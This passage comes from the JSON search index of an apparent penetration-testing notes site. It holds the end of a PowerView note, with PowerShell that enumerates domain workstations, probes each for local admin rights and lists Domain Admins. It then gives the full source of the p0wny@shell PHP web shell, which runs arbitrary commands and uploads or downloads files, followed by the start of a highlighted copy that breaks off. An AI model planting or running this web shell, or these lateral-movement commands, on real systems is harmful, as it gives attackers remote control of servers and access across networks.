class=\"s2\"\u003e\u0026#34;fakedomain\\user\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$passwd\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e//\u003c/span\u003e \u003cspan class=\"n\"\u003eGather\u003c/span\u003e \u003cspan class=\"n\"\u003eList\u003c/span\u003e \u003cspan class=\"n\"\u003eof\u003c/span\u003e \u003cspan class=\"n\"\u003eall\u003c/span\u003e \u003cspan class=\"n\"\u003eworkstations\u003c/span\u003e \u003cspan class=\"n\"\u003eon\u003c/span\u003e \u003cspan class=\"n\"\u003edomain\u003c/span\u003e \u003cspan class=\"n\"\u003eand\u003c/span\u003e \u003cspan class=\"n\"\u003estore\u003c/span\u003e \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003evariable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$comps\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-NetComputer\u003c/span\u003e \u003cspan class=\"n\"\u003e-Domain\u003c/span\u003e \u003cspan class=\"n\"\u003emsp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003elocal\u003c/span\u003e \u003cspan class=\"n\"\u003e-Credential\u003c/span\u003e \u003cspan class=\"nv\"\u003e$creds\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e//\u003c/span\u003e \u003cspan class=\"n\"\u003eAttempt\u003c/span\u003e \u003cspan class=\"n\"\u003eto\u003c/span\u003e \u003cspan class=\"n\"\u003eissue\u003c/span\u003e \u003cspan class=\"n\"\u003ea\u003c/span\u003e \u003cspan class=\"n\"\u003ecommand\u003c/span\u003e \u003cspan class=\"n\"\u003eon\u003c/span\u003e \u003cspan class=\"n\"\u003eeach\u003c/span\u003e \u003cspan class=\"n\"\u003emachine\u003c/span\u003e \u003cspan class=\"p\"\u003e-\u003c/span\u003e \u003cspan class=\"n\"\u003eany\u003c/span\u003e \u003cspan class=\"n\"\u003eresults\u003c/span\u003e \u003cspan class=\"n\"\u003eindicate\u003c/span\u003e \u003cspan class=\"n\"\u003elocal\u003c/span\u003e \u003cspan class=\"n\"\u003eadmin\u003c/span\u003e \u003cspan class=\"n\"\u003eon\u003c/span\u003e \u003cspan class=\"n\"\u003ethat\u003c/span\u003e \u003cspan class=\"n\"\u003emachine\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eInvoke-Command\u003c/span\u003e \u003cspan class=\"n\"\u003e-ScriptBlock\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003ehostname\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"n\"\u003e-Computer\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$comps\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ednshostName\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"n\"\u003e-Credential\u003c/span\u003e \u003cspan class=\"nv\"\u003e$creds\u003c/span\u003e \u003cspan class=\"n\"\u003e-ErrorAction\u003c/span\u003e \u003cspan class=\"n\"\u003eSilentlyContinue\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eList all members of a a given group\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroupMember\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Domain Admins\u0026#34;\u003c/span\u003e \u003cspan class=\"n\"\u003e-Recurse\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Powerview"},{"content":"\r\u0026lt;?php $SHELL_CONFIG = array( \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;p0wny\u0026#39;, \u0026#39;hostname\u0026#39; =\u0026gt; \u0026#39;shell\u0026#39;, ); function expandPath($path) { if (preg_match(\u0026#34;#^(~[a-zA-Z0-9_.-]*)(/.*)?$#\u0026#34;, $path, $match)) { exec(\u0026#34;echo $match[1]\u0026#34;, $stdout); return $stdout[0] . $match[2]; } return $path; } function allFunctionExist($list = array()) { foreach ($list as $entry) { if (!function_exists($entry)) { return false; } } return true; } function executeCommand($cmd) { $output = \u0026#39;\u0026#39;; if (function_exists(\u0026#39;exec\u0026#39;)) { exec($cmd, $output); $output = implode(\u0026#34;\\n\u0026#34;, $output); } else if (function_exists(\u0026#39;shell_exec\u0026#39;)) { $output = shell_exec($cmd); } else if (allFunctionExist(array(\u0026#39;system\u0026#39;, \u0026#39;ob_start\u0026#39;, \u0026#39;ob_get_contents\u0026#39;, \u0026#39;ob_end_clean\u0026#39;))) { ob_start(); system($cmd); $output = ob_get_contents(); ob_end_clean(); } else if (allFunctionExist(array(\u0026#39;passthru\u0026#39;, \u0026#39;ob_start\u0026#39;, \u0026#39;ob_get_contents\u0026#39;, \u0026#39;ob_end_clean\u0026#39;))) { ob_start(); passthru($cmd); $output = ob_get_contents(); ob_end_clean(); } else if (allFunctionExist(array(\u0026#39;popen\u0026#39;, \u0026#39;feof\u0026#39;, \u0026#39;fread\u0026#39;, \u0026#39;pclose\u0026#39;))) { $handle = popen($cmd, \u0026#39;r\u0026#39;); while (!feof($handle)) { $output .= fread($handle, 4096); } pclose($handle); } else if (allFunctionExist(array(\u0026#39;proc_open\u0026#39;, \u0026#39;stream_get_contents\u0026#39;, \u0026#39;proc_close\u0026#39;))) { $handle = proc_open($cmd, array(0 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;r\u0026#39;), 1 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39;)), $pipes); $output = stream_get_contents($pipes[1]); proc_close($handle); } return $output; } function isRunningWindows() { return stripos(PHP_OS, \u0026#34;WIN\u0026#34;) === 0; } function featureShell($cmd, $cwd) { $stdout = \u0026#34;\u0026#34;; if (preg_match(\u0026#34;/^\\s*cd\\s*(2\u0026gt;\u0026amp;1)?$/\u0026#34;, $cmd)) { chdir(expandPath(\u0026#34;~\u0026#34;)); } elseif (preg_match(\u0026#34;/^\\s*cd\\s+(.+)\\s*(2\u0026gt;\u0026amp;1)?$/\u0026#34;, $cmd)) { chdir($cwd); preg_match(\u0026#34;/^\\s*cd\\s+([^\\s]+)\\s*(2\u0026gt;\u0026amp;1)?$/\u0026#34;, $cmd, $match); chdir(expandPath($match[1])); } elseif (preg_match(\u0026#34;/^\\s*download\\s+[^\\s]+\\s*(2\u0026gt;\u0026amp;1)?$/\u0026#34;, $cmd)) { chdir($cwd); preg_match(\u0026#34;/^\\s*download\\s+([^\\s]+)\\s*(2\u0026gt;\u0026amp;1)?$/\u0026#34;, $cmd, $match); return featureDownload($match[1]); } else { chdir($cwd); $stdout = executeCommand($cmd); } return array( \u0026#34;stdout\u0026#34; =\u0026gt; base64_encode($stdout), \u0026#34;cwd\u0026#34; =\u0026gt; base64_encode(getcwd()) ); } function featurePwd() { return array(\u0026#34;cwd\u0026#34; =\u0026gt; base64_encode(getcwd())); } function featureHint($fileName, $cwd, $type) { chdir($cwd); if ($type == \u0026#39;cmd\u0026#39;) { $cmd = \u0026#34;compgen -c $fileName\u0026#34;; } else { $cmd = \u0026#34;compgen -f $fileName\u0026#34;; } $cmd = \u0026#34;/bin/bash -c \\\u0026#34;$cmd\\\u0026#34;\u0026#34;; $files = explode(\u0026#34;\\n\u0026#34;, shell_exec($cmd)); foreach ($files as \u0026amp;$filename) { $filename = base64_encode($filename); } return array( \u0026#39;files\u0026#39; =\u0026gt; $files, ); } function featureDownload($filePath) { $file = @file_get_contents($filePath); if ($file === FALSE) { return array( \u0026#39;stdout\u0026#39; =\u0026gt; base64_encode(\u0026#39;File not found / no read permission.\u0026#39;), \u0026#39;cwd\u0026#39; =\u0026gt; base64_encode(getcwd()) ); } else { return array( \u0026#39;name\u0026#39; =\u0026gt; base64_encode(basename($filePath)), \u0026#39;file\u0026#39; =\u0026gt; base64_encode($file) ); } } function featureUpload($path, $file, $cwd) { chdir($cwd); $f = @fopen($path, \u0026#39;wb\u0026#39;); if ($f === FALSE) { return array( \u0026#39;stdout\u0026#39; =\u0026gt; base64_encode(\u0026#39;Invalid path / no write permission.\u0026#39;), \u0026#39;cwd\u0026#39; =\u0026gt; base64_encode(getcwd()) ); } else { fwrite($f, base64_decode($file)); fclose($f); return array( \u0026#39;stdout\u0026#39; =\u0026gt; base64_encode(\u0026#39;Done.\u0026#39;), \u0026#39;cwd\u0026#39; =\u0026gt; base64_encode(getcwd()) ); } } function initShellConfig() { global $SHELL_CONFIG; if (isRunningWindows()) { $username = getenv(\u0026#39;USERNAME\u0026#39;); if ($username !== false) { $SHELL_CONFIG[\u0026#39;username\u0026#39;] = $username; } } else { $pwuid = posix_getpwuid(posix_geteuid()); if ($pwuid !== false) { $SHELL_CONFIG[\u0026#39;username\u0026#39;] = $pwuid[\u0026#39;name\u0026#39;]; } } $hostname = gethostname(); if ($hostname !== false) { $SHELL_CONFIG[\u0026#39;hostname\u0026#39;] = $hostname; } } if (isset($_GET[\u0026#34;feature\u0026#34;])) { $response = NULL; switch ($_GET[\u0026#34;feature\u0026#34;]) { case \u0026#34;shell\u0026#34;: $cmd = $_POST[\u0026#39;cmd\u0026#39;]; if (!preg_match(\u0026#39;/2\u0026gt;/\u0026#39;, $cmd)) { $cmd .= \u0026#39; 2\u0026gt;\u0026amp;1\u0026#39;; } $response = featureShell($cmd, $_POST[\u0026#34;cwd\u0026#34;]); break; case \u0026#34;pwd\u0026#34;: $response = featurePwd(); break; case \u0026#34;hint\u0026#34;: $response = featureHint($_POST[\u0026#39;filename\u0026#39;], $_POST[\u0026#39;cwd\u0026#39;], $_POST[\u0026#39;type\u0026#39;]); break; case \u0026#39;upload\u0026#39;: $response = featureUpload($_POST[\u0026#39;path\u0026#39;], $_POST[\u0026#39;file\u0026#39;], $_POST[\u0026#39;cwd\u0026#39;]); } header(\u0026#34;Content-Type: application/json\u0026#34;); echo json_encode($response); die(); } else { initShellConfig(); } ?\u0026gt;\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;p0wny@shell:~#\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; /\u0026gt; \u0026lt;style\u0026gt; html, body { margin: 0; padding: 0; background: #333; color: #eee; font-family: monospace; width: 100vw; height: 100vh; overflow: hidden; } *::-webkit-scrollbar-track { border-radius: 8px; background-color: #353535; } *::-webkit-scrollbar { width: 8px; height: 8px; } *::-webkit-scrollbar-thumb { border-radius: 8px; -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3); background-color: #bcbcbc; } #shell { background: #222; box-shadow: 0 0 5px rgba(0, 0, 0, .3); font-size: 10pt; display: flex; flex-direction: column; align-items: stretch; max-width: calc(100vw - 2 * var(--shell-margin)); max-height: calc(100vh - 2 * var(--shell-margin)); resize: both; overflow: hidden; width: 100%; height: 100%; margin: var(--shell-margin) auto; } #shell-content { overflow: auto; padding: 5px; white-space: pre-wrap; flex-grow: 1; } #shell-logo { font-weight: bold; color: #FF4180; text-align: center; } :root { --shell-margin: 25px; } @media (min-width: 1200px) { :root { --shell-margin: 50px !important; } } @media (max-width: 991px), (max-height: 600px) { #shell-logo { font-size: 6px; margin: -25px 0; } :root { --shell-margin: 0 !important; } #shell { resize: none; } } @media (max-width: 767px) { #shell-input { flex-direction: column; } } @media (max-width: 320px) { #shell-logo { font-size: 5px; } } .shell-prompt { font-weight: bold; color: #75DF0B; } .shell-prompt \u0026gt; span { color: #1BC9E7; } #shell-input { display: flex; box-shadow: 0 -1px 0 rgba(0, 0, 0, .3); border-top: rgba(255, 255, 255, .05) solid 1px; padding: 10px 0; } #shell-input \u0026gt; label { flex-grow: 0; display: block; padding: 0 5px; height: 30px; line-height: 30px; } #shell-input #shell-cmd { height: 30px; line-height: 30px; border: none; background: transparent; color: #eee; font-family: monospace; font-size: 10pt; width: 100%; align-self: center; box-sizing: border-box; } #shell-input div { flex-grow: 1; align-items: stretch; } #shell-input input { outline: none; } \u0026lt;/style\u0026gt; \u0026lt;script\u0026gt; var SHELL_CONFIG = \u0026lt;?php echo json_encode($SHELL_CONFIG); ?\u0026gt;; var CWD = null; var commandHistory = []; var historyPosition = 0; var eShellCmdInput = null; var eShellContent = null; function _insertCommand(command) { eShellContent.innerHTML += \u0026#34;\\n\\n\u0026#34;; eShellContent.innerHTML += \u0026#39;\u0026lt;span class=\\\u0026#34;shell-prompt\\\u0026#34;\u0026gt;\u0026#39; + genPrompt(CWD) + \u0026#39;\u0026lt;/span\u0026gt; \u0026#39;; eShellContent.innerHTML += escapeHtml(command); eShellContent.innerHTML += \u0026#34;\\n\u0026#34;; eShellContent.scrollTop = eShellContent.scrollHeight; } function _insertStdout(stdout) { eShellContent.innerHTML += escapeHtml(stdout); eShellContent.scrollTop = eShellContent.scrollHeight; } function _defer(callback) { setTimeout(callback, 0); } function featureShell(command) { _insertCommand(command); if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) { featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]); } else if (/^\\s*clear\\s*$/.test(command)) { // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer eShellContent.innerHTML = \u0026#39;\u0026#39;; } else { makeRequest(\u0026#34;?feature=shell\u0026#34;, {cmd: command, cwd: CWD}, function (response) { if (response.hasOwnProperty(\u0026#39;file\u0026#39;)) { featureDownload(atob(response.name), response.file) } else { _insertStdout(atob(response.stdout)); updateCwd(atob(response.cwd)); } }); } } function featureHint() { if (eShellCmdInput.value.trim().length === 0) return; // field is empty -\u0026gt; nothing to complete function _requestCallback(data) { if (data.files.length \u0026lt;= 1) return; // no completion data.files = data.files.map(function(file){ return atob(file); }); if (data.files.length === 2) { if (type === \u0026#39;cmd\u0026#39;) { eShellCmdInput.value = data.files[0]; } else { var currentValue = eShellCmdInput.value; eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]); } } else { _insertCommand(eShellCmdInput.value); _insertStdout(data.files.join(\u0026#34;\\n\u0026#34;)); } } var currentCmd = eShellCmdInput.value.split(\u0026#34; \u0026#34;); var type = (currentCmd.length === 1) ? \u0026#34;cmd\u0026#34; : \u0026#34;file\u0026#34;; var fileName = (type === \u0026#34;cmd\u0026#34;) ? currentCmd[0] : currentCmd[currentCmd.length - 1]; makeRequest( \u0026#34;?feature=hint\u0026#34;, { filename: fileName, cwd: CWD, type: type }, _requestCallback ); } function featureDownload(name, file) { var element = document.createElement(\u0026#39;a\u0026#39;); element.setAttribute(\u0026#39;href\u0026#39;, \u0026#39;data:application/octet-stream;base64,\u0026#39; + file); element.setAttribute(\u0026#39;download\u0026#39;, name); element.style.display = \u0026#39;none\u0026#39;; document.body.appendChild(element); element.click(); document.body.removeChild(element); _insertStdout(\u0026#39;Done.\u0026#39;); } function featureUpload(path) { var element = document.createElement(\u0026#39;input\u0026#39;); element.setAttribute(\u0026#39;type\u0026#39;, \u0026#39;file\u0026#39;); element.style.display = \u0026#39;none\u0026#39;; document.body.appendChild(element); element.addEventListener(\u0026#39;change\u0026#39;, function () { var promise = getBase64(element.files[0]); promise.then(function (file) { makeRequest(\u0026#39;?feature=upload\u0026#39;, {path: path, file: file, cwd: CWD}, function (response) { _insertStdout(atob(response.stdout)); updateCwd(atob(response.cwd)); }); }, function () { _insertStdout(\u0026#39;An unknown client-side error occurred.\u0026#39;); }); }); element.click(); document.body.removeChild(element); } function getBase64(file, onLoadCallback) { return new Promise(function(resolve, reject) { var reader = new FileReader(); reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); }; reader.onerror = reject; reader.readAsDataURL(file); }); } function genPrompt(cwd) { cwd = cwd || \u0026#34;~\u0026#34;; var shortCwd = cwd; if (cwd.split(\u0026#34;/\u0026#34;).length \u0026gt; 3) { var splittedCwd = cwd.split(\u0026#34;/\u0026#34;); shortCwd = \u0026#34;…/\u0026#34; + splittedCwd[splittedCwd.length-2] + \u0026#34;/\u0026#34; + splittedCwd[splittedCwd.length-1]; } return SHELL_CONFIG[\u0026#34;username\u0026#34;] + \u0026#34;@\u0026#34; + SHELL_CONFIG[\u0026#34;hostname\u0026#34;] + \u0026#34;:\u0026lt;span title=\\\u0026#34;\u0026#34; + cwd + \u0026#34;\\\u0026#34;\u0026gt;\u0026#34; + shortCwd + \u0026#34;\u0026lt;/span\u0026gt;#\u0026#34;; } function updateCwd(cwd) { if (cwd) { CWD = cwd; _updatePrompt(); return; } makeRequest(\u0026#34;?feature=pwd\u0026#34;, {}, function(response) { CWD = atob(response.cwd); _updatePrompt(); }); } function escapeHtml(string) { return string .replace(/\u0026amp;/g, \u0026#34;\u0026amp;amp;\u0026#34;) .replace(/\u0026lt;/g, \u0026#34;\u0026amp;lt;\u0026#34;) .replace(/\u0026gt;/g, \u0026#34;\u0026amp;gt;\u0026#34;); } function _updatePrompt() { var eShellPrompt = document.getElementById(\u0026#34;shell-prompt\u0026#34;); eShellPrompt.innerHTML = genPrompt(CWD); } function _onShellCmdKeyDown(event) { switch (event.key) { case \u0026#34;Enter\u0026#34;: featureShell(eShellCmdInput.value); insertToHistory(eShellCmdInput.value); eShellCmdInput.value = \u0026#34;\u0026#34;; break; case \u0026#34;ArrowUp\u0026#34;: if (historyPosition \u0026gt; 0) { historyPosition--; eShellCmdInput.blur(); eShellCmdInput.value = commandHistory[historyPosition]; _defer(function() { eShellCmdInput.focus(); }); } break; case \u0026#34;ArrowDown\u0026#34;: if (historyPosition \u0026gt;= commandHistory.length) { break; } historyPosition++; if (historyPosition === commandHistory.length) { eShellCmdInput.value = \u0026#34;\u0026#34;; } else { eShellCmdInput.blur(); eShellCmdInput.focus(); eShellCmdInput.value = commandHistory[historyPosition]; } break; case \u0026#39;Tab\u0026#39;: event.preventDefault(); featureHint(); break; } } function insertToHistory(cmd) { commandHistory.push(cmd); historyPosition = commandHistory.length; } function makeRequest(url, params, callback) { function getQueryString() { var a = []; for (var key in params) { if (params.hasOwnProperty(key)) { a.push(encodeURIComponent(key) + \u0026#34;=\u0026#34; + encodeURIComponent(params[key])); } } return a.join(\u0026#34;\u0026amp;\u0026#34;); } var xhr = new XMLHttpRequest(); xhr.open(\u0026#34;POST\u0026#34;, url, true); xhr.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); xhr.onreadystatechange = function() { if (xhr.readyState === 4 \u0026amp;\u0026amp; xhr.status === 200) { try { var responseJson = JSON.parse(xhr.responseText); callback(responseJson); } catch (error) { alert(\u0026#34;Error while parsing response: \u0026#34; + error); } } }; xhr.send(getQueryString()); } document.onclick = function(event) { event = event || window.event; var selection = window.getSelection(); var target = event.target || event.srcElement; if (target.tagName === \u0026#34;SELECT\u0026#34;) { return; } if (!selection.toString()) { eShellCmdInput.focus(); } }; window.onload = function() { eShellCmdInput = document.getElementById(\u0026#34;shell-cmd\u0026#34;); eShellContent = document.getElementById(\u0026#34;shell-content\u0026#34;); updateCwd(); eShellCmdInput.focus(); }; \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;shell\u0026#34;\u0026gt; \u0026lt;pre id=\u0026#34;shell-content\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;shell-logo\u0026#34;\u0026gt; ___ ____ _ _ _ _ _ \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; _ __ / _ \\__ ___ __ _ _ / __ \\ ___| |__ ___| | |_ /\\/|| || |_ \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026#39;_ \\| | | \\ \\ /\\ / / \u0026#39;_ \\| | | |/ / _` / __| \u0026#39;_ \\ / _ \\ | (_)/\\/_ .. _|\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | |_) | |_| |\\ V V /| | | | |_| | | (_| \\__ \\ | | | __/ | |_ |_ _|\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | .__/ \\___/ \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_) |_||_| \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; |_| |___/ \\____/ \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;div id=\u0026#34;shell-input\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;shell-cmd\u0026#34; id=\u0026#34;shell-prompt\u0026#34; class=\u0026#34;shell-prompt\u0026#34;\u0026gt;???\u0026lt;/label\u0026gt; \u0026lt;div\u0026gt; \u0026lt;input id=\u0026#34;shell-cmd\u0026#34; name=\u0026#34;cmd\u0026#34; onkeydown=\u0026#34;_onShellCmdKeyDown(event)\u0026#34;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;\r","date":"2023-09-07","id":91,"permalink":"/notes/shell-and-payload/pownyshell/","summary":"\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$SHELL_CONFIG\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s1\"\u003e\u0026#39;username\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;p0wny\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s1\"\u003e\u0026#39;hostname\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;shell\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eexpandPath\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$path\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#^(~[a-zA-Z0-9_.-]*)(/.*)?$#\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$path\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$match\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003eexec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;echo \u003c/span\u003e\u003cspan class=\"si\"\u003e$match[1]\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$stdout\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nv\"\u003e$stdout\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"nv\"\u003e$match\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nv\"\u003e$path\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eallFunctionExist\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$list\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eforeach\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$list\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"nv\"\u003e$entry\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan 